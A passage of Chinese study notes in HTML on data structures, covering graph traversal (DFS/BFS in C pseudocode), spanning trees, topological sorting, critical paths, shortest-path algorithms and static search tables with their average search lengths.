<li>info指向和边有关的各种信息；</li>
</ul>
</li>
<li>顶点结点有2个域：<ul>
<li>data域存储和该顶点相关的信息；</li>
<li>firstedge域指示第一条依附于该顶点的边；</li>
</ul>
</li>
<li>所有依附于同一顶点的边串联在同一链表中，由于每条边依附于两个顶点，则每个边结点同时链接在两个链表中。</li>
</ul>
</li>
<li>对无向图而言，其邻接多重表和邻接表的差别，仅仅在于同一条边在邻接表中用两个结点表示，而在邻接多重表中只有一个结点。</li>
<li>除了在边结点中增加了一个标志域外，邻接多重表所需的存储量和邻接表相同。</li>
</ol>
<h2 id="7-3-图的遍历"><a href="#7-3-图的遍历" class="headerlink" title="7.3 图的遍历"></a>7.3 图的遍历</h2><ol>
<li>和树的遍历类似，我们希望从图中某一顶点出发访遍图中其余顶点，且使每一个顶点仅被访问一次。这就是<strong>图的遍历（Traversing Graph）</strong>。</li>
<li>图的遍历算法是求解图的连通性问题、拓扑排序和求关键路径等算法的基础。</li>
<li>为了避免同一顶点被访问多次，可以设一个辅助数组visited[0..n-1]，初始值置为“假”或者零，一旦访问了某个顶点，便置对应的visited为“真”或者被访问时的次序号。</li>
<li>这两种遍历图的路径对于无向图和有向图都适用。</li>
</ol>
<h3 id="7-3-1-深度优先搜索"><a href="#7-3-1-深度优先搜索" class="headerlink" title="7.3.1 深度优先搜索"></a>7.3.1 深度优先搜索</h3><ol>
<li><p><strong>深度优先搜索（Depth-First Search，DFS）</strong>遍历是树的先根遍历的推广。</p>
</li>
<li><p>深度优先搜索：</p>
<ul>
<li>从某个顶点v出发，访问此顶点；</li>
<li>然后依次<strong>从v的未被访问的邻接点出发</strong>深度优先遍历图，直至和v相通的顶点都被访问到；</li>
<li>若此时图中还有未访问过的顶点，则选择它并重复上述过程，直至图中所有顶点都被访问。</li>
</ul>
<p>这显然是一个递归的过程。</p>
</li>
<li><p>算法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Boolean visited[MAX];</span><br><span class="line">Status (*VisitFunc)(<span class="keyword">int</span> v);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFSTraverse</span><span class="params">(Graph G, Status (*Visit)(<span class="keyword">int</span> v))</span> </span>&#123;</span><br><span class="line">  VisitFunc = Visit;</span><br><span class="line">  <span class="keyword">for</span> (v = <span class="number">0</span>; v &lt; G.vexnum; ++v)</span><br><span class="line">    visited[v] = FALSE;</span><br><span class="line">  <span class="keyword">for</span> (v = <span class="number">0</span>; v &lt; G.vexnum; ++v)</span><br><span class="line">    <span class="keyword">if</span> (!visited[v])</span><br><span class="line">      DFS(G, v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(Graph G, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">  visited[v] = TRUE;</span><br><span class="line">  VisitFunc(v);</span><br><span class="line">  <span class="keyword">for</span> (w = FirstAdjVex(G, v); w &gt;= <span class="number">0</span>; w = NextAdjVex(G, v, w))</span><br><span class="line">    <span class="keyword">if</span> (!visited[w])</span><br><span class="line">      DFS(G, w);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每个顶点至多调用一次DFS函数。</p>
</li>
<li><p>深度优先搜索遍历图的过程实质上就是对每个顶点查找其邻接点的过程，（查找每个顶点）耗费的时间则取决于所采用的存储结构：</p>
<ul>
<li>邻接矩阵：O($n^{2}$)；</li>
<li>邻接表：O(e)</li>
</ul>
<p>则以邻接表作存储结构时，深度优先搜索遍历图的时间复杂度为O(n+e)。</p>
</li>
</ol>
<h3 id="7-3-2-广度优先搜索"><a href="#7-3-2-广度优先搜索" class="headerlink" title="7.3.2 广度优先搜索"></a>7.3.2 广度优先搜索</h3><ol>
<li><p><strong>广度优先搜索（Breadth-First Search，BFS）</strong>遍历类似于树的按层次遍历的过程。</p>
</li>
<li><p>广度优先搜索：</p>
<ul>
<li>从某个顶点v出发，访问此顶点；</li>
<li>然后依次<strong>访问v的各个未被访问的邻接点</strong>；</li>
<li>然后分别从这些邻接点出发依次访问它们的邻接点，并使“先访问的顶点的邻接点”先于“后访问顶点的邻接点”被访问，直至所有已访问的顶点的邻接点都被访问到；</li>
<li>若此时图中还有未访问过的顶点，则选择它并重复上述过程，直至图中所有顶点都被访问。</li>
</ul>
<p>广度优先搜索遍历图的过程是以v为起始点，由近及远，依次访问和v有路径相通且路径长度为1, 2, …的顶点。</p>
</li>
<li><p>除了需要设visited数组之外，为了顺次访问路径长度为2, 3, …的顶点，还需附设队列以存储已被访问的路径长度为1, 2, …的顶点。</p>
<p>算法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFSTraverse</span><span class="params">(Graph G, Status (*Visit)(<span class="keyword">int</span> v))</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (v = <span class="number">0</span>; v &lt; G.vexnum; ++v)</span><br><span class="line">    visited[v] = FALSE;</span><br><span class="line">  InitQueue(Q);</span><br><span class="line">  <span class="keyword">for</span> (v = <span class="number">0</span>; v &lt; G.vexnum; ++v)</span><br><span class="line">    <span class="keyword">if</span> (!visited[v]) &#123;</span><br><span class="line">      visited[v] = TRUE;</span><br><span class="line">      Visit(v);</span><br><span class="line">      EnQueue(Q, v);</span><br><span class="line">      <span class="keyword">while</span> (!QueueEmpty(Q)) &#123;</span><br><span class="line">        DeQueue(Q, u);</span><br><span class="line">        <span class="keyword">for</span> (w = FirstAdjVex(G, u); w &gt;= <span class="number">0</span>; w = NextAdjVex(G, u, w))</span><br><span class="line">          <span class="keyword">if</span> (!visited[w]) &#123;</span><br><span class="line">            visited[w] = TRUE;</span><br><span class="line">            Visit(w);</span><br><span class="line">            EnQueue(Q, w);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每个顶点至多进一次队列。</p>
</li>
<li><p>广度优先搜索遍历图的过程实质上是通过边或弧找邻接点的过程，故时间复杂度和DFS遍历相通，不同之处仅仅在于对顶点访问的顺序不同。</p>
</li>
<li><p>BFS搜索一般采用队列来暂存刚访问过的顶点；DFS搜索一般采用栈来暂存刚访问过的顶点。</p>
</li>
</ol>
<h2 id="7-4-图的连通性问题"><a href="#7-4-图的连通性问题" class="headerlink" title="7.4 图的连通性问题"></a>7.4 图的连通性问题</h2><h3 id="7-4-1-无向图的连通分量和生成树"><a href="#7-4-1-无向图的连通分量和生成树" class="headerlink" title="7.4.1 无向图的连通分量和生成树"></a>7.4.1 无向图的连通分量和生成树</h3><ol>
<li><p>在非连通图中，一次DFS或BFS过程得到的顶点访问序列恰为图中各连通分量中的顶点集，分别加上所有依附于这些顶点的边，便构成了非连通图的若干个连通分量。</p>
</li>
<li><p>在连通图中，从某一顶点出发，进行一次DFS或BFS，可将边分为访问过的边和未访问过的边，其中访问过的边再加上所有顶点，就构成了连通图的一个极小连通子图，是连通图的一棵生成树。（<strong>生成树和极小连通子图都只存在于连通图</strong>）</p>
<p>（<strong>“图G的生成树是该图的一个极小连通子图”这种说法为什么是错误的？</strong>）</p>
<p>称DFS得到的生成树为深度优先生成树，BFS得到的生成树为广度优先生成树。</p>
</li>
<li><p>在非连通图中，有若干棵生成树，组成非连通图的生成森林。</p>
<p>同样分为两类。</p>
</li>
<li><p>算法的时间复杂度和遍历相同。</p>
</li>
</ol>
<h3 id="7-4-2-有向图的强连通分量"><a href="#7-4-2-有向图的强连通分量" class="headerlink" title="7.4.2 有向图的强连通分量"></a>7.4.2 有向图的强连通分量</h3><ol>
<li><p><strong>深度</strong>优先搜索是求有向图的强连通分量的一个新的有效方法。</p>
</li>
<li><p>假设以十字链表作有向图的存储结构，求强连通分量的步骤如下：</p>
<ul>
<li>从某顶点出发，进行一次DFS遍历，按退出DFS函数的顺序排列顶点，得到finished数组；</li>
<li>从最后完成搜索的顶点（finished[vexnum-1]）出发，逆向DFS遍历，直至所有顶点都被访问。</li>
</ul>
<p>每一次调用DFS作逆向深度优先遍历所访问到的顶点集，也就是得到深度优先生成森林中每一棵树的顶点集，就是有向图G中一个强连通分量的顶点集。</p>
</li>
<li><p>算法的时间复杂度亦和遍历相同。</p>
</li>
</ol>
<h3 id="7-4-3-最小生成树"><a href="#7-4-3-最小生成树" class="headerlink" title="7.4.3 最小生成树"></a>7.4.3 最小生成树</h3><ol>
<li><p>一棵生成树的代价就是树上各边的代价之和，为使总耗费最少，就是构造连通网的最小代价生成树（Minimum Cost Spanning Tree，<strong>最小生成树</strong>）的问题。</p>
</li>
<li><p>MST性质：假设有一个连通网，若其中权值最小的边的两个顶点分别在两个互补顶点集中，则它的最小生成树必包含这条边。</p>
</li>
<li><p>构造（无向图）最小生成树有两种算法：</p>
<ul>
<li><p><strong>普里姆（Prim）算法</strong></p>
<p>核心思想是<strong>加点</strong>。</p>
<p>从某一顶点开始，寻找与它相连的且相连边权最小的顶点，将它们加入已经访问的顶点集合。再次寻找与这两个顶点相连的所有顶点中相连边权最小的顶点，并加入顶点集合。重复此步骤，直到访问了所有顶点，即全部顶点都已加入已经访问的顶点集合。</p>
<p>由于需要求最小权值、选择具有最小代价的边，故时间复杂度为O($n^{2}$)，和边数无关，适用于求边稠密的网的最小生成树。</p>
</li>
<li><p><strong>克鲁斯卡尔（Kruskal）算法</strong></p>
<p>核心思想是<strong>加边</strong>。</p>
<p>将图中所有边按权值大小进行排序，从权最小的边开始，逐条边加入生成树中，注意加边后不可与已加入的边构成环，直至所有顶点均连通。</p>
<p>至多对e条边各扫描一次，每次选择最小权的边仅需O(loge)的时间（前提以“堆”存放，且第一次需O(e)）；每个连通分量看成一个等价类，加边则相当于求等价类，仅需O(eloge)时间（前提以MFSet类型来描述），故时间复杂度为O(eloge)，和顶点数无关，适合于求边稀疏的网的最小生成树。</p>
</li>
</ul>
<p>具体算法请走<a href="https://www.superpung.xyz/Data-Structures-Experiment-11/">传送门</a>。</p>
</li>
</ol>
<h3 id="7-4-4-关节点和重连通分量"><a href="#7-4-4-关节点和重连通分量" class="headerlink" title="7.4.4 关节点和重连通分量"></a>7.4.4 关节点和重连通分量</h3><ol>
<li>若删去顶点v以及和v相关联的各边后，图的一个连通分量被分割成了两个以上的连通分量，则称顶点v为该图的一个<strong>关节点（articulation point，割点）</strong>。</li>
<li>一个没有关节点的连通图是一个<strong>重连通图（biconnected graph）</strong>。</li>
<li>重连通图的任意一对顶点之间至少存在两条路径，以至于删去某顶点以及边后也不会破坏图的连通性。</li>
<li>若在连通图上至少删去k个顶点才能破坏图的连通性，则称此图的<strong>连通度</strong>为k。</li>
<li>利用DFS便可求得图的关节点，并由此可判别图是否是重连通的：<ul>
<li>若生成树的根有两棵或两棵以上的子树，则此根顶点必为关节点；</li>
<li>若生成树中某个非叶子顶点v，其某棵子树的根和子树中的其他结点均没有指向v的祖先的回边，则v为关节点。</li>
</ul>
</li>
<li>求关节点的时间复杂度仍为O(n+e)。</li>
</ol>
<h2 id="7-5-有向无环图及其应用"><a href="#7-5-有向无环图及其应用" class="headerlink" title="7.5 有向无环图及其应用"></a>7.5 有向无环图及其应用</h2><ol>
<li><p>一个无环的有向图称做<strong>有向无环图（directed acycline graph，DAG图）</strong>。</p>
</li>
<li><p>DAG图是一类比有向树更一般的特殊有向图：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/DAG%E5%9B%BE.png" alt="DAG图"></p>
<p>从左至右依次为有向树、DAG图和有向图。</p>
</li>
<li><p>二叉树可以表示表达式，若表达式含有公共子式，则可以用DAG图实现对相同子式的共享，从而节省存储空间。</p>
</li>
<li><p>判定一个图是有向无环图，需要在有向图中检查是否存在环：</p>
<ul>
<li>在无向图中，若DFS遍历过程中遇到回边，则必定存在环；</li>
<li>在有向图中，这条回边可能是指向深度优先生成森林中另一棵生成树上顶点的弧。</li>
</ul>
<p>在有向图中，若从顶点v开始进行DFS遍历，结束之前出现一条从顶点u到顶点v的回边，由于u在生成树上是v的子孙，则有向图中必定存在包含顶点v和u的环。</p>
</li>
<li><p>几乎所有工程（project）都可分为若干个子工程，称为<strong>活动（activity）</strong>。活动之间通常受一定条件的约束，即存在先后次序。</p>
</li>
<li><p>工程是否顺利进行？——拓扑排序；</p>
<p>估算整个工程完成所必需的最短时间——求关键路径。</p>
</li>
</ol>
<h3 id="7-5-1-拓扑排序"><a href="#7-5-1-拓扑排序" class="headerlink" title="7.5.1 拓扑排序"></a>7.5.1 拓扑排序</h3><ol>
<li><p><strong>拓扑排序（Topological Sort）</strong>就是由某个集合上的一个偏序得到该集合上的一个全序的操作。</p>
<p>（偏序关系：自反、反对称、传递。）</p>
<p>（设R是集合X上的<strong>偏序（Partial Order）</strong>，如果对X中每个x和y，必有xRy或yRx，则称R是集合X上的全序关系。）</p>
<p>直观来说，偏序指集合中仅有部分成员之间可比较，而全序指集合中全体成员之间均可比较：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%81%8F%E5%BA%8F%E5%85%A8%E5%BA%8F.png" alt="偏序全序"></p>
<p>左侧为偏序，右侧为全序。</p>
</li>
<li><p>若在偏序中添加条件使得可以表示全序，则这个全序称为<strong>拓扑有序（Topological Order）</strong>，这个操作便是拓扑排序。</p>
</li>
<li><p>用顶点表示活动、用弧表示活动间的优先关系的有向图称为<strong>顶点表示活动的网（Activity On Vertex Network，AOV-网）</strong>。</p>
</li>
<li><p>AOV-网中不能出现有向环。若网中所有顶点都在它的拓扑有序序列中，则该AOV-网中必定不存在环。</p>
</li>
<li><p>构造拓扑序列：</p>
<ul>
<li>在有向图中选一个没有前驱的顶点且输出之；</li>
<li>从图中删除该顶点和所有以它为尾的弧；</li>
<li>重复上述两步，直至全部顶点均已输出，或者当前图中不存在无前驱的顶点为止（这种情况说明有向图中存在环）。</li>
</ul>
</li>
<li><p>具体算法请走<a href="https://www.superpung.xyz/Data-Structures-Experiment-12/">传送门</a>。</p>
</li>
<li><p>拓扑排序总的时间复杂度为O(n+e)。</p>
</li>
<li><p>当有向图无环时，按退出DFS函数的先后记录下来的顶点序列即为逆向的拓扑有序序列。</p>
</li>
</ol>
<h3 id="7-5-2-关键路径"><a href="#7-5-2-关键路径" class="headerlink" title="7.5.2 关键路径"></a>7.5.2 关键路径</h3><ol>
<li><p>AOE-网（Activity On Edge）是边表示活动的网，是一个带权的有向无环图。顶点表示事件（Event），弧表示活动，权表示活动持续的时间。</p>
</li>
<li><p>工程只有一个开始点和一个完成点，故在正常无环的情况下，网中只有一个入度为零的点（源点）和一个出度为零的点（汇点）。</p>
</li>
<li><p>和AOV-网不同，AOE-网研究的问题是：</p>
<ul>
<li>完成整项工程需要多少时间？</li>
<li>哪些活动是影响工程进度的关键？</li>
</ul>
</li>
<li><p>AOE-网中有些活动可以并行地进行，所以总时间是最长路径的加权长度，最长的路径就是<strong>关键路径（Critical Path）</strong>。</p>
</li>
<li><p>从开始点到某一顶点的最长路径长度叫做对应事件的最早发生时间，决定了以该顶点为尾的弧所表示的活动的最早开始时间。</p>
</li>
<li><p>还可以定义一个活动的最迟开始时间，与最早开始时间之差尾该活动的时间余量，时间余量为零的活动就是<strong>关键活动</strong>。</p>
</li>
<li><p>关键路径上的所有活动都是关键活动，因此提前完成非关键活动并不能加快工程的进度。所以分析关键路径的目的就是找出关键活动，争取关键活动的工效，缩短整个工期。</p>
</li>
<li><p>由分析知，要求关键路径，就要找关键活动，就要先求事件的最早和最迟开始时间e和l：</p>
<ul>
<li>最早开始时间就是活动的最早发生时间；</li>
<li>最迟开始时间就是活动的最迟发生时间减去持续时间dut；</li>
</ul>
<p>求最早和最迟发生时间ve和vl：</p>
<ul>
<li><p>从ve(0)=0开始向前递推，每次取ve+dut的最大值：</p>
<p>ve(j)=Max{ve(i)+dut(&lt;i,j&gt;)}, &lt;i,j&gt;∈T, j=1,2,…,n-1, T是所有以第j个顶点为头的弧的集合（前提拓扑有序，因为ve(j-1)必须在vj的所有前驱的最早发生时间求得之后才能确定）；</p>
</li>
<li><p>从vl(n-1)=ve(n-1)开始向后递推，每次取vl-dut的最小值；</p>
<p>vl(i)=Min{vl(j)-dut(&lt;i,j&gt;)}, &lt;i,j&gt;∈S, i=n-2,…,0, S是所有以第i个顶点为尾的弧的集合（前提逆拓扑有序，因为vl(j-1)必须在vj的所有后继的最迟发生时间求得之后才能确定）；</p>
</li>
</ul>
</li>
<li><p>求关键路径的算法：</p>
<ul>
<li>输入e条弧，建立AOE-网；</li>
<li>从源点v0出发，令ve[0]=0，按拓扑有序求其余各顶点的最早发生时间ve（若检查存在环则终止）；</li>
<li>从汇点vn出发，令vl[n-1]= ve[n-1]，按逆拓扑有序求其余各顶点的最迟发生时间vl；</li>
<li>根据各顶点的ve和vl值，求每条弧的最早开始时间e和最迟开始时间l。</li>
</ul>
<p>若某条弧满足条件e=l，则为关键活动。</p>
</li>
<li><p>逆拓扑排序可用DFS。求关键路径算法的时间复杂度为O(n+e)。</p>
</li>
<li><p>关键活动的速度提高是有限度的，只有在不改变网的关键路径的情况下，提高关键活动的速度才有效，且必须提高同时在几条关键路径上的活动的速度。</p>
</li>
</ol>
<h2 id="7-6-最短路径"><a href="#7-6-最短路径" class="headerlink" title="7.6 最短路径"></a>7.6 最短路径</h2><p>路径上的第一个顶点为<strong>源点（Source）</strong>，最后一个顶点为<strong>终点（Destination）</strong>，路径长度的度量是路径上边的权值之和。</p>
<h3 id="7-6-1-从某个源点到其余各顶点的最短路径"><a href="#7-6-1-从某个源点到其余各顶点的最短路径" class="headerlink" title="7.6.1 从某个源点到其余各顶点的最短路径"></a>7.6.1 从某个源点到其余各顶点的最短路径</h3><p>解决单源点的最短路径问题——迪杰斯特拉（Dijkstra）算法：</p>
<p>具体算法请走<a href="https://www.superpung.xyz/Data-Structures-Experiment-13/">传送门</a>。</p>
<h3 id="7-6-2-每一对顶点之间的最短路径"><a href="#7-6-2-每一对顶点之间的最短路径" class="headerlink" title="7.6.2 每一对顶点之间的最短路径"></a>7.6.2 每一对顶点之间的最短路径</h3><ol>
<li><p>根据上一节的从单个源点到其余各顶点的最短路径算法，此处只需每次以一个顶点为源点，重复执行Dijkstra算法n次即可，总执行时间为O($n^{3}$)。</p>
</li>
<li><p>下面介绍由弗洛伊德（Floyd）提出的另一个算法，时间复杂度也是O($n^{3}$)，但形式上更简单。</p>
</li>
<li><p>Floyd算法仍从图的带权邻接矩阵cost出发，其基本思想是（求顶点vi到vj的最短路径）：</p>
<ul>
<li>若vi到vj有弧，则为一条路径，但不一定最短，还需进行n次试探；</li>
<li>考虑(vi,v0,vj)是否存在，和(vi,vj)相比，取较短的作为<code>中间顶点序号≤0</code>的最短路径；</li>
<li>增加顶点，若(vi,…,v1)和(v1,…,vj)分别是当前找到的<code>中间顶点序号≤0</code>的最短路径，则(vi,…,v1,…,vj)可能是<code>中间顶点序号≤1</code>的最短路径；</li>
<li>将<code>中间顶点序号≤0</code>的最短路径和<code>中间顶点序号≤1</code>的最短路径相比，取较短的作为<code>中间顶点序号≤1</code>的最短路径；</li>
<li>增加顶点，继续试探……</li>
</ul>
<blockquote>
<p>一般情况下，若(vi,…,vk)是从vi到vk的<code>中间顶点序号≤k-1</code>的最短路径、(vk,…,vj)是从vk到vj的<code>中间顶点序号≤k-1</code>的最短路径，则将(vi,…,vk,…,vj)和已经得到的从vi到vj的<code>中间顶点序号≤k-1</code>的最短路径相比，取较短的就是从vi到vj的<code>中间顶点序号≤k</code>的最短路径。</p>
</blockquote>
<p>这样经过n次比较后，最后求得的必是从vi到vj的最短路径。</p>
</li>
</ol>
<h1 id="第8章-动态存储管理"><a href="#第8章-动态存储管理" class="headerlink" title="第8章 动态存储管理"></a>第8章 动态存储管理</h1><h1 id="第9章-查找"><a href="#第9章-查找" class="headerlink" title="第9章 查找"></a>第9章 查找</h1><ol>
<li><p><strong>查找表（Search Table）</strong>是由同一类型的数据元素（或记录）构成的集合。</p>
<p>日常生活中的电话号码簿和字典等都可视作一张查找表。</p>
</li>
<li><p>“集合”中的数据元素之间存在着完全松散的关系，因此查找表是一种非常灵便的数据结构。</p>
</li>
<li><p><strong>静态查找表（Static Search Table）</strong>只进行查找操作：</p>
<ul>
<li><strong>查询</strong>特定数据元素是否在表中</li>
<li><strong>检索</strong>特定数据元素的各种属性</li>
</ul>
<p><strong>动态查找表（Dynamic Search Table）</strong>除了进行查找操作，还进行：</p>
<ul>
<li>在表中<strong>插入</strong>一个数据元素</li>
<li>从表中<strong>删除</strong>某个数据元素</li>
</ul>
</li>
<li><p><strong>关键字（Key）</strong>：数据元素（或记录）中某个数据项的值，用以识别某个数据元素（或记录）：</p>
<ul>
<li><strong>主关键字（Primary Key）</strong>：可以唯一地标识一个记录的关键字；</li>
<li><strong>次关键字（Secondary Key）</strong>：可以标识若干记录的关键字。</li>
</ul>
<p>当数据元素只有一个数据项时，其关键字就是该数据元素的值。</p>
</li>
<li><p><strong>查找（Searching）</strong>：根据给定的某个值，在查找表中确定一个其关键字等于给定值的记录或数据元素：</p>
<ul>
<li><strong>查找成功</strong>：表中存在符合条件的记录（此时查找结果可以是记录的信息，也可以是记录在查找表中的位置）；</li>
<li><strong>查找不成功</strong>：表中不存在符合条件的记录（此时查找结果可给出一个“空”记录或“空”指针）。</li>
</ul>
</li>
<li><p>查找的过程依赖于数据元素在结构中所处的地位。</p>
</li>
<li><p>约定如下的宏定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对数值型关键字</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EQ(a,b) ((a) == (b))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LT(a,b) ((a) &lt; (b))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LQ(a,b) ((a) &lt;= (b))</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// 对字符串型关键字</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EQ(a,b) (!strcmp((a), (b)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LT(a,b) (strcmp((a), (b)) &lt; 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LQ(a,b) (strcmp((a), (b)) &lt;= 0)</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h2 id="9-1-静态查找表"><a href="#9-1-静态查找表" class="headerlink" title="9.1 静态查找表"></a>9.1 静态查找表</h2></li>
</ol>
<h3 id="9-1-1-顺序表的查找"><a href="#9-1-1-顺序表的查找" class="headerlink" title="9.1.1 顺序表的查找"></a>9.1.1 顺序表的查找</h3><ol>
<li><p>线性链表模块的查找与顺序存储结构模块的查找类似，不再赘述。</p>
</li>
<li><p><strong>顺序查找（Sequential Search）</strong>：从表中最后一个记录开始向前查找：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Search_Seq</span><span class="params">(SSTable ST, KeyType key)</span> </span>&#123;</span><br><span class="line">  ST.elem[<span class="number">0</span>].key = key;</span><br><span class="line">  <span class="keyword">for</span> (i = ST.length; !EQ(ST.elem[i],key,key); --i);</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在零处设置“哨兵”，用于结束查找不成功的情况，免去查找过程中每一步都要检测整个表是否查找完毕。</p>
</li>
<li><p><strong>平均查找长度（Average Search Length，ASL）</strong>：和给定值进行比较的关键字的个数的期望值：$$ASL=\sum_{i=1}^{n}P_{i}C_{i}$$$P_{i}$为查找表中第$i$个记录的概率，总和为1；$C_{i}$为查找到第$i$个记录时已经比较过的关键字个数，顺序查找中为$n-i+1$。</p>
</li>
<li><p>等概率（1/n）下顺序查找的平均查找长度为(n+1)/2。</p>
</li>
<li><p>有时可以根据实际情况调整查找概率并排序，可以提高查找效率。</p>
</li>
<li><p>当记录的查找概率无法预知时，可以根据每次查找时对其访问的频度作以调整，保持按访问频度非递减有序的次序，使查找概率大的记录在查找过程中不断后移。</p>
</li>
<li><p>当查找不成功的情形不能忽视时，ASL应为成功与不成功时的ASL之和。此时等概率（1/2n）下顺序查找的平均查找长度为3(n+1)/4。</p>
</li>
</ol>
<h3 id="9-1-2-有序表的查找"><a href="#9-1-2-有序表的查找" class="headerlink" title="9.1.2 有序表的查找"></a>9.1.2 有序表的查找</h3><ol>
<li><p><strong>折半查找（Binary Search）</strong>：先确定待查记录所在的范围（区间），然后逐步缩小范围直到找到或找不到该记录为止。</p>
</li>
<li><p>折半查找的过程可用二叉树来描述，称为判定树。</p>
<p>找到有序表中任一记录的过程就是走了一条从根结点到与该记录相应的结点的路径，和给定值进行比较的关键字个数最多不超过树的深度。</p>
<blockquote>
<p>判定树非完全二叉树，但其叶子结点所在层次之差最多为1，则n个结点的判定树的深度和n个结点的完全二叉树的深度相同，均为$\lfloor log_{2}n\rfloor+1$。</p>
</blockquote>
</li>
<li><p>折半查找法在查找成功时和给定值进行比较的关键字个数至多为$\lfloor log_{2}n\rfloor+1$。</p>
</li>
<li><p>在判定树的空指针域加上一个指向方形结点的指针，这些方形结点就是判定树的外部结点（圆形结点为内部结点）。</p>
<p>则查找不成功时就是走到了外部结点上，此时比较过的关键字个数就是路径上内部结点的个数。</p>
<p>因此不成功时的比较过的关键字个数不超过$\lfloor log_{2}n\rfloor+1$。</p>
</li>
<li><p>折半查找的平均查找长度为$\frac{n+1}{n}log_{2}(n+1)-1$，当n较大（&gt;50）时，近似为$log_{2}(n+1)-1$。</p>
</li>
<li><p>优点：比顺序查找效率高；</p>
<p>缺点：只适用于顺序存储的有序表。</p>
</li>
<li><p><strong>斐波那契查找</strong>：根据斐波那契序列的特点对表进行分割，分段进行查找。</p>
<p>优点：平均性能比折半查找好，分割时只需进行加、减运算；</p>
<p>缺点：最坏情况下的性能（虽然仍是O(logn)）比折半查找差。</p>
</li>
<li><p><strong>插值查找</strong>：根据给定值key来确定进行比较的关键字。</p>
<p>只适用于关键字均匀分布的表，此时对于表长较大的顺序表，其平均查找性能比折半查找好。</p>
</li>
</ol>
<h3 id="9-1-3-静态树表的查找"><a href="#9-1-3-静态树表的查找" class="headerlink" title="9.1.3 静态树表的查找"></a>9.1.3 静态树表的查找</h3><ol>
<li>下面考虑有序表中各记录的查找概率不等的情况，此时折半查找的性能未必是最优的。</li>
<li>设判定树的带权内路径长度之和为PH值$$PH=\sum_{i=1}{n}w_{i}h_{i}$$$w_{i}=cp_{i}$，c为某常量，p为结点的查找概率；h为层数。</li>
<li>查找性能最佳的判定树是PH最小的二叉树，称为<strong>静态最优查找树（Static Optimal Search Tree）</strong>。</li>
<li>若一棵二叉树的PH值在所有具有同样权值的二叉树中近似为最小，则称这类二叉树为<strong>次优查找树（Nearly Optimal Search Tree）</strong>。</li>
</ol>
<h3 id="9-1-4-索引顺序表的查找"><a href="#9-1-4-索引顺序表的查找" class="headerlink" title="9.1.4 索引顺序表的查找"></a>9.1.4 索引顺序表的查找</h3><ol>
<li><p><strong>分块查找</strong>又称<strong>索引顺序查找</strong>，是顺序查找的一种改进方法。</p>
</li>
<li><p>在此查找法中，除表本身以外，还需建立一个“索引表”，存放：</p>
<ul>
<li>关键字项：每个分块的最大关键字；</li>
<li>指针项：每块第一个记录在表中的位置。</li>
</ul>
</li>
<li><p>索引表按关键字有序，则表或者有序或者分块有序（块的最大关键字有序）。</p>
</li>
<li><p>根据结构的特点，分块查找过程需分两步进行：</p>
<ul>
<li>确定待查记录所在的块（子表）；</li>
<li>在块中顺序查找（若有序则可折半查找）。</li>
</ul>
</li>
<li><p>分块查找的平均查找长度：</p>
<p>（表长为n、均匀分成b块、每块含有s个记录、每个记录查找概率均等）</p>
<p>采用顺序查找：</p>
<ul>
<li>此时ASL=(n/s+s)/2+1，当$s=\sqrt n$时，ASL取最小值$\sqrt{n}+1$。虽然较顺序查找有了很大改进，但远不及折半查找。</li>
</ul>
<p>采用折半查找：</p>
<ul>
<li>ASL约为$log_{2}(\frac{n}{s}+1)+\frac{s}{2}$</li>
</ul>
</li>
<li><p>查找方法比较：</p>
<table>
<thead>
<tr>
<th>比较项</th>
<th>顺序查找</th>
<th>折半查找</th>
<th>分块查找</th>
</tr>
</thead>
<tbody><tr>
<td>ASL</td>
<td>最大</td>
<td>最小</td>
<td>两者之间</td>
</tr>
<tr>
<td>表结构</td>
<td>有序表、无序表</td>
<td>有序表</td>
<td>分块有序表</td>
</tr>
<tr>
<td>存储结构</td>
<td>顺序存储结构、线性链表</td>
<td>顺序存储结构</td>
<td>顺序存储结构、线性链表</td>
</tr>
</tbody></table>
</li>
<li><p>几种查找表的特性：</p>
<table>
<thead>
<tr>
<th>表类型</th>
<th>查找</th>
<th>插入</th>
<th>删除</th>
</tr>
</thead>
<tbody><tr>
<td>无序顺序表</td>
<td>O(n)</td>
<td>O(1)</td>
<td>O(n)</td>
</tr>
<tr>
<td>无序线性链表</td>
<td>O(n)</td>
<td>O(1)</td>
<td>O(1)</td>
</tr>
<tr>
<td>有序顺序表</td>
<td>O(logn)</td>
<td>O(n)</td>
<td>O(n)</td>
</tr>
<tr>
<td>有序线性链表</td>
<td>O(n)</td>
<td>O(1)</td>
<td>O(1)</td>
</tr>
</tbody></table>
</li>
</ol>
<h2 id="9-2-动态查找表"><a href="#9-2-动态查找表" class="headerlink" title="9.2 动态查找表"></a>9.2 动态查找表</h2><p>动态查找表的特点是表结构本身是在查找过程中动态生成的，即查找不成功时将key值插入。</p>
